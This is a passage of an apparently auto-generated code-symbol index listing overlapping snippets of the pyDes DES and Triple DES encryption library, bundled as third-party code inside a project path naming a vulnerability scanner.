        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tBn[pos]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2\n\t\t\t\tBn[pos + 2] = (v & 2) >> 1\n\t\t\t\tBn[pos + 3] = v & 1\n\t\t\t\tpos += 4\n\t\t\t\tj += 1\n\t\t\t# Permutate the concatination of B[1] to B[8] (Bn)\n\t\t\tself.R = self.__permutate(des.__p, Bn)\n\t\t\t# Xor with L[i - 1]\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.L))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.R = self.__permutate(des.__p, Bn)\n\t\t\t# Xor with L[i - 1]\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.L))\n\t\t\t# Optimization: This now replaces the below commented code\n\t\t\t#j = 0\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t\t\t#\tj += 1\n\t\t\t# L[i] becomes R[i - 1]\n\t\t\tself.L = tempR",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.R",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.L))\n\t\t\t# Optimization: This now replaces the below commented code\n\t\t\t#j = 0\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t\t\t#\tj += 1\n\t\t\t# L[i] becomes R[i - 1]\n\t\t\tself.L = tempR\n\t\t\ti += 1\n\t\t\titeration += iteration_adjustment",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#j",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#j = 0\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t\t\t#\tj += 1\n\t\t\t# L[i] becomes R[i - 1]\n\t\t\tself.L = tempR\n\t\t\ti += 1\n\t\t\titeration += iteration_adjustment\n\t\t# Final permutation of R[16]L[16]\n\t\tself.final = self.__permutate(des.__fp, self.R + self.L)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#\tself.R[j]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t\t\t#\tj += 1\n\t\t\t# L[i] becomes R[i - 1]\n\t\t\tself.L = tempR\n\t\t\ti += 1\n\t\t\titeration += iteration_adjustment\n\t\t# Final permutation of R[16]L[16]\n\t\tself.final = self.__permutate(des.__fp, self.R + self.L)\n\t\treturn self.final\n\t# Data to be encrypted/decrypted",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.L",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.L = tempR\n\t\t\ti += 1\n\t\t\titeration += iteration_adjustment\n\t\t# Final permutation of R[16]L[16]\n\t\tself.final = self.__permutate(des.__fp, self.R + self.L)\n\t\treturn self.final\n\t# Data to be encrypted/decrypted\n\tdef crypt(self, data, crypt_type):\n\t\t\"\"\"Crypt the data in blocks, running it through des_crypt()\"\"\"\n\t\t# Error check the data",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.final",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.final = self.__permutate(des.__fp, self.R + self.L)\n\t\treturn self.final\n\t# Data to be encrypted/decrypted\n\tdef crypt(self, data, crypt_type):\n\t\t\"\"\"Crypt the data in blocks, running it through des_crypt()\"\"\"\n\t\t# Error check the data\n\t\tif not data:\n\t\t\treturn ''\n\t\tif len(data) % self.block_size != 0:\n\t\t\tif crypt_type == des.DECRYPT: # Decryption must work on 8 byte blocks",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tiv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tiv = self.__String_to_BitList(self.getIV())\n\t\t\telse:\n\t\t\t\traise ValueError(\"For CBC mode, you must supply the Initial Value (IV) for ciphering\")\n\t\t# Split the data into blocks, crypting each one seperately\n\t\ti = 0\n\t\tdict = {}\n\t\tresult = []\n\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\ti = 0\n\t\tdict = {}\n\t\tresult = []\n\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdict",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdict = {}\n\t\tresult = []\n\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t\t\t#\tcached += 1",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tresult",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tresult = []\n\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t\t\t#\tcached += 1\n\t\t\t#\tresult.append(dict[data[i:i+8]])",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t#cached",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t\t\t#\tcached += 1\n\t\t\t#\tresult.append(dict[data[i:i+8]])\n\t\t\t#\ti += 8",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t#lines",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t\t\t#\tcached += 1\n\t\t\t#\tresult.append(dict[data[i:i+8]])\n\t\t\t#\ti += 8\n\t\t\t#\tcontinue",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tblock = self.__String_to_BitList(data[i:i+8])\n\t\t\t# Xor with IV if using CBC mode\n\t\t\tif self.getMode() == CBC:\n\t\t\t\tif crypt_type == des.ENCRYPT:\n\t\t\t\t\tblock = list(map(lambda x, y: x ^ y, block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(block):\n\t\t\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tblock = list(map(lambda x, y: x ^ y, block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(block):\n\t\t\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t\tif crypt_type == des.DECRYPT:\n\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t#j",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(block):\n\t\t\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t\tif crypt_type == des.DECRYPT:\n\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t#\tblock[j]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t\tif crypt_type == des.DECRYPT:\n\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tprocessed_block",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t\tif crypt_type == des.DECRYPT:\n\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tprocessed_block",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t#j",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t# Add the resulting crypted block to our list",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t#\tprocessed_block[j]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t# Add the resulting crypted block to our list\n\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tiv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t# Add the resulting crypted block to our list\n\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)\n\t\t\tresult.append(self.__BitList_to_String(processed_block))\n\t\t\t#dict[data[i:i+8]] = d",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\tiv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t# Add the resulting crypted block to our list\n\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)\n\t\t\tresult.append(self.__BitList_to_String(processed_block))\n\t\t\t#dict[data[i:i+8]] = d\n\t\t\ti += 8\n\t\t# print \"Lines: %d, cached: %d\" % (lines, cached)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tprocessed_block",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\t\t\t# Add the resulting crypted block to our list\n\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)\n\t\t\tresult.append(self.__BitList_to_String(processed_block))\n\t\t\t#dict[data[i:i+8]] = d\n\t\t\ti += 8\n\t\t# print \"Lines: %d, cached: %d\" % (lines, cached)\n\t\t# Return the full crypted string\n\t\tif _pythonMajorVersion < 3:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#d",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)\n\t\t\tresult.append(self.__BitList_to_String(processed_block))\n\t\t\t#dict[data[i:i+8]] = d\n\t\t\ti += 8\n\t\t# print \"Lines: %d, cached: %d\" % (lines, cached)\n\t\t# Return the full crypted string\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join(result)\n\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t#dict[data[i:i+8]]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t#dict[data[i:i+8]] = d\n\t\t\ti += 8\n\t\t# print \"Lines: %d, cached: %d\" % (lines, cached)\n\t\t# Return the full crypted string\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join(result)\n\t\telse:\n\t\t\treturn bytes.fromhex('').join(result)\n\tdef encrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"encrypt(data, [pad], [padmode]) -> bytes",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self._padData(data, pad, padmode)\n\t\treturn self.crypt(data, des.ENCRYPT)\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\t\tdata : Bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self._padData(data, pad, padmode)\n\t\treturn self.crypt(data, des.ENCRYPT)\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\t\tdata : Bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._padData(data, pad, padmode)\n\t\treturn self.crypt(data, des.ENCRYPT)\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\t\tdata : Bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the\n\t\toptional padding character is supplied, then the un-encrypted",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self.crypt(data, des.DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)\n#############################################################################\n# \t\t\t\tTriple DES\t\t\t\t    #\n#############################################################################\nclass triple_des(_baseDes):\n\t\"\"\"Triple DES encryption/decrytpion class",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self.crypt(data, des.DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)\n#############################################################################\n# \t\t\t\tTriple DES\t\t\t\t    #\n#############################################################################\nclass triple_des(_baseDes):\n\t\"\"\"Triple DES encryption/decrytpion class\n\tThis algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or\n\tthe DES-EDE2 (when a 16 byte key is supplied) encryption methods.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self.crypt(data, des.DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)\n#############################################################################\n# \t\t\t\tTriple DES\t\t\t\t    #\n#############################################################################\nclass triple_des(_baseDes):\n\t\"\"\"Triple DES encryption/decrytpion class\n\tThis algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or\n\tthe DES-EDE2 (when a 16 byte key is supplied) encryption methods.\n\tSupports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.key_size",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.key_size = 24  # Use DES-EDE3 mode\n\t\tif len(key) != self.key_size:\n\t\t\tif len(key) == 16: # Use DES-EDE2 mode\n\t\t\t\tself.key_size = 16\n\t\t\telse:\n\t\t\t\traise ValueError(\"Invalid triple DES key size. Key must be either 16 or 24 bytes long\")\n\t\tif self.getMode() == CBC:\n\t\t\tif not self.getIV():\n\t\t\t\t# Use the first 8 bytes of the key\n\t\t\t\tself._iv = key[:self.block_size]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tself.key_size",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tself.key_size = 16\n\t\t\telse:\n\t\t\t\traise ValueError(\"Invalid triple DES key size. Key must be either 16 or 24 bytes long\")\n\t\tif self.getMode() == CBC:\n\t\t\tif not self.getIV():\n\t\t\t\t# Use the first 8 bytes of the key\n\t\t\t\tself._iv = key[:self.block_size]\n\t\t\tif len(self.getIV()) != self.block_size:\n\t\t\t\traise ValueError(\"Invalid IV, must be 8 bytes in length\")\n\t\tself.__key1 = des(key[:8], self._mode, self._iv,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tself._iv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tself._iv = key[:self.block_size]\n\t\t\tif len(self.getIV()) != self.block_size:\n\t\t\t\traise ValueError(\"Invalid IV, must be 8 bytes in length\")\n\t\tself.__key1 = des(key[:8], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tself.__key2 = des(key[8:16], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tif self.key_size == 16:\n\t\t\tself.__key3 = self.__key1\n\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.__key1",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.__key1 = des(key[:8], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tself.__key2 = des(key[8:16], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tif self.key_size == 16:\n\t\t\tself.__key3 = self.__key1\n\t\telse:\n\t\t\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t\t\t  self._padding, self._padmode)\n\t\t_baseDes.setKey(self, key)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tself.__key2",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tself.__key2 = des(key[8:16], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tif self.key_size == 16:\n\t\t\tself.__key3 = self.__key1\n\t\telse:\n\t\t\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t\t\t  self._padding, self._padmode)\n\t\t_baseDes.setKey(self, key)\n\t# Override setter methods to work on all 3 keys.\n\tdef setMode(self, mode):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.__key3",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tself.__key3 = self.__key1\n\t\telse:\n\t\t\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t\t\t  self._padding, self._padmode)\n\t\t_baseDes.setKey(self, key)\n\t# Override setter methods to work on all 3 keys.\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\t_baseDes.setMode(self, mode)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tself.__key3",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
